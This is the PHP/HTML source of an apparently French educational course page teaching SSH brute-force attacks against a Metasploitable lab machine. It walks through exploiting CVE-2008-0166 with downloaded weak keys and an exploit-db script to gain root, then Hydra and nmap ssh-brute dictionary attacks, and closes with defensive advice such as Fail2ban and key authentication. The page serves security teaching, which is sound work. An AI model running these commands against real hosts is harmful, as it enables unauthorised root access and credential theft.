<?php
require('../db/connexionDB.php');           // Fichier PHP contenant la connexion à la BDD
session_start();                            // On démarre la session
if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur connecté, redirection vers la page de connexion
{ 
  ?>
  <script language="Javascript">
    document.location.replace("../login.php");
  </script>
  <?php
}
?>

<!DOCTYPE html>
<html lang="fr">
  <?php // En-tête de la page ?>
  <head>
    <?php // Balises meta responsive ?>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale-1">

    <?php // Bootstrap CSS ?>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    
    <?php // jQuery et Bootstrap JS ?>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    
    <?php // Feuille de style ?>
    <link rel="stylesheet" href="../style.css">

    <?php // Titre principal et icône de la page ?>
    <title>SSH</title>
    <link rel="icon" type="image/png" sizes="16x16" href="../images/deathstarw.png">
  </head>

  <?php // Corps de la page ?>
  <body style="background-color: rgba(45,54,69)">
    <?php 
    // Inclusion de la barre de navigation
    require_once('menuCourses.php');

    // Mise en place d'un fil d'Arianne
    ?>
    <div class="centrer" style="box-shadow: 0 5px 5px rgba(0, 0, 0, .2);">  
      <div class="breadcrumb">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
              <li class="breadcrumb-item"><a href="../index.php">Accueil</a></li>
              <li class="breadcrumb-item"><a href="../courses.php">Cours</a></li>
              <li class="breadcrumb-item active" aria-current="page">Attaque par brute force sur le protocle SSH</li>
            </ol>
          </nav>
      </div>
      <h1>Attaque par brute force sur le protocle SSH</h1>
      </br>
      </br>
    </div>
    </br>
    </br>
    <?php // Cours ?>
    <div class="container-fluid">
      <?php // Insertion de la vidéo Youtube du tutoriel ?>
      <div class="row justify-content-center">
          <div class="group col-sm-0">
            <iframe width="560" height="315" src="https://www.youtube.com/embed/qPLiStrB8Ms" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
          </div> 
      </div> 
      
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            Dans ce tutoriel, nous allons exploiter différentes façons de réaliser une attaque par brute force.
            </br>
            </br>
            Dans un premier temps, nous allons nous intéresser à la vulnérabilité CVE-2008-0166.
            </br>
            </br>
            Cette CVE est une vulnérabilité dans la version de OpenSSH propre aux distributions Debian, Ubuntu ou à leurs dérivés permet à un utilisateur distant de contourner la politique de sécurité ou de porter atteinte à la confidentialité du système vulnérable.
            </br>
            </br>
            Le script python permettant l’exploit se situe sur le lien suivant : <a target="_blank" style="text-decoration:underline" href="https://www.exploit-db.com/exploits/5720">https://www.exploit-db.com/exploits/5720</a>
            </br>
            </br>
            Premièrement, télécharger les clés vulnérables précalculées            
            </br>
            </br>
            <kbd>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2</kbd>
            </br>
            </br>
            Dézippez-le 
            </br>
            </br>
            <kbd> tar jxf 5622.tar.bz2</kbd>
            </br>
            </br>
            Exécuter la commande :
            </br>
            </br>
            <kbd> python 5720.py rsa/2048/ 192.168.1.67 root 22 5</kbd>
            </br>
            </br>
          </p>
        </div>
      </div>


      <div class="row justify-content-center">
        <div class="group col-sm-0">      
        <img src="../images/ssh1.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
        </div>
      </div>

      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            L’adresse IP 192.168.1.67 correspond à notre machine victime metasploitable qui peut donc changer selon votre réseau.
            </br>
            </div>
        </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh2.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>

     <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            rsa/2048 est le dossier qui contient les clés.
            </br>
            </br>
            On exécute ensuite la 2eme commande proposée :
            </br>
            </br>
            <kbd>ssh -lroot -p22 -i rsa/2048//57c3115d77c56390332dc5c49978627a-5429 192.168.1.67</kbd>
            </br>
            </br>
            L’exécution peut prendre un certain temps.
            </br>
          </p>
        </div>
      </div>

      <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh3.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>
        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            On récupère ainsi un accès root grâce à la CVE-2008-0166.
            </br>
            </br>
          </p>
        </div>
      </div>
    
    
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            Le prochain outil que nous utiliserons est Hydra, il s’agit d’un puissant cracker de connexion qui est très rapide et supporte un certain nombre de protocoles différents. 
            </br>
            </br>
            Dans notre cas, nous allons tester une attaque par dictionnaire simple.
            </br>
            </br>
            L'attaque par dictionnaire est une méthode utilisée en cryptanalyse pour trouver un mot de passe ou une clé. Elle consiste à tester une série de mots de passe potentiels, les uns à la suite des autres, en espérant que le mot de passe utilisé pour le chiffrement soit contenu dans le dictionnaire. Si ce n'est pas le cas, l'attaque échouera.
            </br>
            </br>
            Cette méthode repose sur le fait que de nombreuses personnes utilisent des mots de passe courants (par exemple : un prénom, une couleur ou le nom d'un animal). C'est pour cette raison qu'il est toujours conseillé de ne pas utiliser de mot de passe comprenant un mot ou un nom.
            </br>
            </br>
            L'attaque par dictionnaire est une méthode souvent utilisée en complément de l'attaque par force brute qui consiste à tester, de manière exhaustive, les différentes possibilités de mots de passe. Cette dernière est particulièrement efficace pour des mots de passe n'excédant pas 5 ou 6 caractères.       
            </br>
            </br>
          </p>
        </div>
      </div>
    
      <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh4.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
      </div>
                
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            Hydra contient une série d'options, mais aujourd'hui nous allons utiliser les suivantes :
            </br>
            </br>
            - L’option -L, qui spécifie une liste de login de connexion.
            </br>
            </br>
            -	L’option -P, qui spécifie une liste de mots de passe.
            </br>
            </br>
            -	ssh://172.16.1.102 qui représente notre adresse IP cible et notre protocole.
            </br>
            </br>
            -	L'indicateur -t réglé sur 4, qui définit le nombre de tâches parallèles à exécuter.
            </br>
            </br>
            </br>
            </br>
            Il faut aussi utiliser une liste de login (users.txt) et de mots de passe (pass.txt)
            </br>
          </p>
        </div>
      </div>

      <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh5.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          <img src="../images/ssh6.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
      </div>
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            Une fois lancé, l'outil affichera l'état de l'attaque :
            </br>
            </br>
            <kbd>hydra -L users.txt -P pass.txt ssh://192.168.1.67 -t 8</kbd>
            </br>
          </p>
        </div>
      </div>

      <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh7.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
      </div>

      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            On arrive donc à récupérer des identifiants valides pour se connecter avec ssh :
            </br>
            </br>
          </p>
        </div>
      </div>

      <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh8.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </br>
          </br>
          </div>
      </div>

      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            La dernière méthode pour brute forcer des identifiants SSH implique l'utilisation de l’outil Nmap. 
            </br>
            </br>
            NSE contient un script qui tentera de forcer toutes les combinaisons possibles d'une paire de nom d'utilisateur et de mot de passe. Pour réaliser cette attaque, nous pouvons lancer une simple analyse Nmap à partir d'un nouveau terminal, comme auparavant, mais avec quelques options supplémentaires :
            </br>
            </br>
            -	--script ssh-brute spécifie le script à utiliser.
            </br>
            </br>
            -	--script-args définit les arguments du script, séparés par une virgule.
            </br>
            </br>
            -	userdb=users.txt est la liste des noms d'utilisateurs que nous souhaitons utiliser.
            </br>
            </br>
            -	passdb=pass.txt est la liste des mots de passe que nous souhaitons utiliser.
            </br>
            </br>
          </p>
        </div>
      </div>

      <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh9.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
      </div>
    
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            NSE affichera les tentatives de force brute et les identifiants qui sont en cours d'essai. En fonction du nombre de noms d'utilisateur et de mots de passe utilisés, cela peut prendre un certain temps.
            </br>
            </br>
            <kbd>nmap 192.168.1.67 -p 22 --script ssh-brute --script-args userdb=users.txt, passdb=pass.txt</kbd>
            </br>
            </br>
            Au bout d'un certain temps, le balayage sera terminé et un rapport sera affiché dans le terminal.
            </br>
          </p>
        </div>
      </div>

      <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/ssh10.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
      </div>
    
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            Ci-dessus, on peut voir que le script a trouvé plusieurs identifiants de connexion valides. Ce script est utile car il va itérer à travers toutes les paires possibles de noms d'utilisateur et de mots de passe, ce qui donnera parfois plus de résultats.
            </br>
            </br>
          </p>
        </div>
      </div>

      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            </br>
            </br>
            Comment se prévenir du "Brute-Forcing" par SSH ?
            </br>
            </br>
            La réalité est que si vous avez un serveur face à l'internet, il y aura chaque jour des tas de tentatives de recours à la force brute en SSH, dont beaucoup sont automatisées
            </br>
            </br>
            L'une des choses les plus simples à faire est peut-être de changer le numéro de port sur lequel SSH opère. Bien que cela dissuade les tentatives de force brute les plus rudimentaires, il est trivial de rechercher les SSH fonctionnant sur d'autres ports.
            </br>
            </br>
            Une meilleure méthode consiste à mettre en place un service comme Fail2ban, DenyHosts ou iptables pour bloquer les tentatives de force brute au niveau de l'hôte. 
            </br>
            </br>
            Cette méthode, combinée à l'utilisation d'une authentification par clé privée au lieu de mots de passe, vous mettra hors de portée de la plupart des attaquants. Si l'authentification par mot de passe est absolument nécessaire, utilisez des mots de passe longs et complexes.
            </br>
            </br>
          </p>
        </div>
      </div>

    </div>
  </body>
  <?php 
  // Inclusion de la barre de navigation
  require_once('footerCourses.php'); 
  ?>
</html>